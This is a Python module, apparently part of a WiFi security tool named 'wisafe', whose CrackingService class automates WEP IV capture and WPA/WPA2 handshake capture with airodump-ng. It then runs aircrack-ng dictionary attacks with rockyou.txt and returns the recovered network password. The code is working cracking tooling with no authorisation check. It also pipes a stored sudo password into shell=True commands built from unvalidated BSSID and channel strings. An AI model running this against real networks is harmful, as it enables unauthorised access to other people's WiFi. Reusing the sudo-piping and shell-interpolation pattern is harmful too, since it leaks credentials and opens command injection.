import subprocess
import re
import os
import time
import threading
from typing import Dict, Any, Optional, Generator
from pathlib import Path
import json
from config import Config

class CrackingService:
    """프로토콜별 WiFi 크래킹 서비스"""
    
    def __init__(self, wordlist_path: str = "/usr/share/wordlists/rockyou.txt"):
        """
        Args:
            wordlist_path: WPA/WPA2 크래킹용 wordlist 경로
        """
        self.wordlist_path = wordlist_path
        self.cracking_processes = {}  # 진행 중인 크래킹 프로세스 저장
        self.cracking_results = {}  # 크래킹 결과 저장
        self.cracking_progress = {}  # 크래킹 진행 상황 저장
        
    def start_cracking(self, wifi_data: Dict[str, Any], interface: Optional[str] = None) -> str:
        """크래킹 시작"""
        protocol = wifi_data.get('protocol', '').upper()
        bssid = wifi_data.get('bssid', '')
        ssid = wifi_data.get('ssid', '')
        channel = wifi_data.get('channel', 0)
        
        # 크래킹 ID 생성
        cracking_id = f"{bssid}_{int(time.time())}"
        
        # 프로토콜별 크래킹 시작
        if protocol == 'OPEN':
            self.cracking_progress[cracking_id] = {
                'status': 'error',
                'message': 'OPEN 네트워크는 크래킹이 불필요합니다.',
                'progress': 100
            }
            return cracking_id
        elif protocol == 'WEP':
            thread = threading.Thread(
                target=self._crack_wep,
                args=(cracking_id, bssid, ssid, channel, interface)
            )
            thread.daemon = True
            thread.start()
        elif protocol in ['WPA', 'WPA2', 'WPA2_WPS']:
            thread = threading.Thread(
                target=self._crack_wpa,
                args=(cracking_id, bssid, ssid, channel, interface)
            )
            thread.daemon = True
            thread.start()
        elif protocol == 'WPA3':
            self.cracking_progress[cracking_id] = {
                'status': 'error',
                'message': 'WPA3는 현재 크래킹이 매우 어렵습니다.',
                'progress': 100
            }
            return cracking_id
        else:
            self.cracking_progress[cracking_id] = {
                'status': 'error',
                'message': f'지원하지 않는 프로토콜: {protocol}',
                'progress': 100
            }
            return cracking_id
        
        # 초기 진행 상황 설정
        self.cracking_progress[cracking_id] = {
            'status': 'running',
            'message': '크래킹을 시작합니다...',
            'progress': 0,
            'step': 'initializing'
        }
        
        return cracking_id
    
    def _crack_wep(self, cracking_id: str, bssid: str, ssid: str, channel: int, interface: Optional[str]):
        """WEP 크래킹"""
        try:
            # 진행 상황 업데이트
            self.cracking_progress[cracking_id] = {
                'status': 'running',
                'message': 'IV 패킷 수집 중...',
                'progress': 10,
                'step': 'collecting_iv'
            }
            
            # 모니터 모드 인터페이스 확인
            if not interface:
                interface = self._detect_monitor_interface()
            
            if not interface:
                self.cracking_progress[cracking_id] = {
                    'status': 'error',
                    'message': '모니터 모드 인터페이스를 찾을 수 없습니다.',
                    'progress': 100
                }
                return
            
            # airodump-ng로 IV 수집
            output_dir = f"/tmp/wisafe_crack_{cracking_id}"
            os.makedirs(output_dir, exist_ok=True)
            cap_file = os.path.join(output_dir, "wep_capture")
            
            # airodump-ng 실행 (30초 동안 IV 수집, sudo 비밀번호 자동 입력)
            airodump_process = subprocess.Popen(
                f"echo '{Config.SUDO_PASSWORD}' | sudo -S airodump-ng -c {channel} --bssid {bssid} -w {cap_file} --output-format cap {interface}",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # IV 수집 대기 (실제로는 더 많은 IV가 필요하지만 데모용으로 짧게)
            time.sleep(30)
            
            airodump_process.terminate()
            try:
                airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_process.kill()
            
            # 진행 상황 업데이트
            self.cracking_progress[cracking_id] = {
                'status': 'running',
                'message': 'IV 패킷 분석 중...',
                'progress': 50,
                'step': 'analyzing_iv'
            }
            
            # aircrack-ng로 크래킹 시도
            cap_files = [f for f in os.listdir(output_dir) if f.endswith('.cap')]
            if not cap_files:
                self.cracking_progress[cracking_id] = {
                    'status': 'error',
                    'message': 'IV 패킷을 충분히 수집하지 못했습니다.',
                    'progress': 100
                }
                return
            
            cap_file_path = os.path.join(output_dir, cap_files[0])
            
            # aircrack-ng 실행 (sudo 비밀번호 자동 입력)
            aircrack_process = subprocess.Popen(
                f"echo '{Config.SUDO_PASSWORD}' | sudo -S aircrack-ng {cap_file_path}",
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # 자동으로 엔터 입력 (기본 옵션 선택)
            aircrack_process.stdin.write('\n')
            aircrack_process.stdin.flush()
            
            # 출력 읽기
            output = ''
            start_time = time.time()
            timeout = 60  # 60초 타임아웃
            
            while time.time() - start_time < timeout:
                if aircrack_process.poll() is not None:
                    break
                
                # 진행 상황 읽기
                line = aircrack_process.stdout.readline()
                if line:
                    output += line
                    # IV 개수 파싱
                    iv_match = re.search(r'(\d+)\s+IV', line)
                    if iv_match:
                        iv_count = int(iv_match.group(1))
                        progress = min(50 + (iv_count / 10000) * 40, 90)
                        self.cracking_progress[cracking_id] = {
                            'status': 'running',
                            'message': f'IV 분석 중... ({iv_count} IVs)',
                            'progress': int(progress),
                            'step': 'cracking'
                        }
            
            # 프로세스 종료
            aircrack_process.terminate()
            try:
                aircrack_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                aircrack_process.kill()
            
            # 결과 확인
            if 'KEY FOUND' in output:
                key_match = re.search(r'KEY FOUND!\s*\[(.+)\]', output)
                if key_match:
                    key = key_match.group(1)
                    self.cracking_results[cracking_id] = {
                        'success': True,
                        'password': key,
                        'method': 'WEP IV attack'
                    }
                    self.cracking_progress[cracking_id] = {
                        'status': 'completed',
                        'message': f'크래킹 성공! 키: {key}',
                        'progress': 100,
                        'step': 'completed'
                    }
                else:
                    self.cracking_results[cracking_id] = {
                        'success': False,
                        'message': '키를 찾았지만 파싱 실패'
                    }
                    self.cracking_progress[cracking_id] = {
                        'status': 'failed',
                        'message': '크래킹 실패: 키 파싱 오류',
                        'progress': 100
                    }
            else:
                self.cracking_results[cracking_id] = {
                    'success': False,
                    'message': '충분한 IV를 수집하지 못했습니다.'
                }
                self.cracking_progress[cracking_id] = {
                    'status': 'failed',
                    'message': '크래킹 실패: IV 부족',
                    'progress': 100
                }
            
            # 임시 파일 정리
            try:
                import shutil
                shutil.rmtree(output_dir, ignore_errors=True)
            except:
                pass
                
        except Exception as e:
            self.cracking_progress[cracking_id] = {
                'status': 'error',
                'message': f'크래킹 오류: {str(e)}',
                'progress': 100
            }
    
    def _crack_wpa(self, cracking_id: str, bssid: str, ssid: str, channel: int, interface: Optional[str]):
        """WPA/WPA2 크래킹 (사전 공격)"""
        try:
            # 진행 상황 업데이트
            self.cracking_progress[cracking_id] = {
                'status': 'running',
                'message': '핸드셰이크 캡처 중...',
                'progress': 10,
                'step': 'capturing_handshake'
            }
            
            # 모니터 모드 인터페이스 확인
            if not interface:
                interface = self._detect_monitor_interface()
            
            if not interface:
                self.cracking_progress[cracking_id] = {
                    'status': 'error',
                    'message': '모니터 모드 인터페이스를 찾을 수 없습니다.',
                    'progress': 100
                }
                return
            
            # wordlist 파일 확인
            if not os.path.exists(self.wordlist_path):
                # 기본 wordlist가 없으면 작은 wordlist 생성 (데모용)
                self.wordlist_path = self._create_demo_wordlist()
            
            # airodump-ng로 핸드셰이크 캡처
            output_dir = f"/tmp/wisafe_crack_{cracking_id}"
            os.makedirs(output_dir, exist_ok=True)
            cap_file = os.path.join(output_dir, "wpa_capture")
            
            # airodump-ng 실행 (sudo 비밀번호 자동 입력)
            airodump_process = subprocess.Popen(
                f"echo '{Config.SUDO_PASSWORD}' | sudo -S airodump-ng -c {channel} --bssid {bssid} -w {cap_file} --output-format cap {interface}",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # 진행 상황 업데이트
            self.cracking_progress[cracking_id] = {
                'status': 'running',
                'message': '핸드셰이크 대기 중... (클라이언트 연결 필요)',
                'progress': 20,
                'step': 'waiting_handshake'
            }
            
            # 핸드셰이크 캡처 대기 (60초)
            time.sleep(60)
            
            airodump_process.terminate()
            try:
                airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_process.kill()
            
            # cap 파일 확인
            cap_files = [f for f in os.listdir(output_dir) if f.endswith('.cap')]
            if not cap_files:
                self.cracking_progress[cracking_id] = {
                    'status': 'error',
                    'message': '핸드셰이크를 캡처하지 못했습니다.',
                    'progress': 100
                }
                return
            
            cap_file_path = os.path.join(output_dir, cap_files[0])
            
            # 진행 상황 업데이트
            self.cracking_progress[cracking_id] = {
                'status': 'running',
                'message': '사전 공격 진행 중...',
                'progress': 40,
                'step': 'dictionary_attack'
            }
            
            # aircrack-ng로 사전 공격 (sudo 비밀번호 자동 입력)
            aircrack_process = subprocess.Popen(
                f"echo '{Config.SUDO_PASSWORD}' | sudo -S aircrack-ng -w {self.wordlist_path} -b {bssid} {cap_file_path}",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # 출력 읽기
            output = ''
            start_time = time.time()
            timeout = 300  # 5분 타임아웃
            last_progress = 40
            
            while time.time() - start_time < timeout:
                if aircrack_process.poll() is not None:
                    break
                
                # 진행 상황 읽기
                line = aircrack_process.stdout.readline()
                if line:
                    output += line
                    # 키 테스트 진행률 파싱
                    progress_match = re.search(r'(\d+\.\d+)%', line)
                    if progress_match:
                        progress = float(progress_match.group(1))
                        last_progress = 40 + int(progress * 0.5)  # 40-90% 범위
                        self.cracking_progress[cracking_id] = {
                            'status': 'running',
                            'message': f'사전 공격 진행 중... ({progress:.1f}%)',
                            'progress': last_progress,
                            'step': 'dictionary_attack'
                        }
            
            # 프로세스 종료
            aircrack_process.terminate()
            try:
                aircrack_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                aircrack_process.kill()
            
            # 결과 확인
            if 'KEY FOUND' in output:
                key_match = re.search(r'KEY FOUND!\s*\[(.+)\]', output)
                if key_match:
                    key = key_match.group(1)
                    self.cracking_results[cracking_id] = {
                        'success': True,
                        'password': key,
                        'method': 'Dictionary attack'
                    }
                    self.cracking_progress[cracking_id] = {
                        'status': 'completed',
                        'message': f'크래킹 성공! 패스워드: {key}',
                        'progress': 100,
                        'step': 'completed'
                    }
                else:
                    self.cracking_results[cracking_id] = {
                        'success': False,
                        'message': '키를 찾았지만 파싱 실패'
                    }
                    self.cracking_progress[cracking_id] = {
                        'status': 'failed',
                        'message': '크래킹 실패: 키 파싱 오류',
                        'progress': 100
                    }
            else:
                self.cracking_results[cracking_id] = {
                    'success': False,
                    'message': '사전 공격 실패: wordlist에 패스워드가 없습니다.'
                }
                self.cracking_progress[cracking_id] = {
                    'status': 'failed',
                    'message': '크래킹 실패: wordlist에 일치하는 패스워드 없음',
                    'progress': 100
                }
            
            # 임시 파일 정리
            try:
                import shutil
                shutil.rmtree(output_dir, ignore_errors=True)
            except:
                pass
                
        except Exception as e:
            self.cracking_progress[cracking_id] = {
                'status': 'error',
                'message': f'크래킹 오류: {str(e)}',
                'progress': 100
            }
    
    def _detect_monitor_interface(self) -> Optional[str]:
        """모니터 모드 인터페이스 감지"""
        try:
            result = subprocess.run(
                ['iwconfig'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            for line in result.stdout.split('\n'):
                if 'Mode:Monitor' in line:
                    match = re.search(r'^(\w+)\s+', line)
                    if match:
                        return match.group(1)
            
            return None
        except:
            return None
    
    def _create_demo_wordlist(self) -> str:
        """데모용 작은 wordlist 생성"""
        demo_words = [
            'password', '12345678', 'qwerty', 'admin', 'welcome',
            'password123', '123456789', 'letmein', 'monkey', 'dragon'
        ]
        
        wordlist_path = '/tmp/wisafe_demo_wordlist.txt'
        with open(wordlist_path, 'w') as f:
            f.write('\n'.join(demo_words))
        
        return wordlist_path
    
    def get_progress(self, cracking_id: str) -> Dict[str, Any]:
        """크래킹 진행 상황 조회"""
        return self.cracking_progress.get(cracking_id, {
            'status': 'not_found',
            'message': '크래킹 ID를 찾을 수 없습니다.',
            'progress': 0
        })
    
    def get_result(self, cracking_id: str) -> Optional[Dict[str, Any]]:
        """크래킹 결과 조회"""
        return self.cracking_results.get(cracking_id)

# 전역 인스턴스
cracking_service = CrackingService()

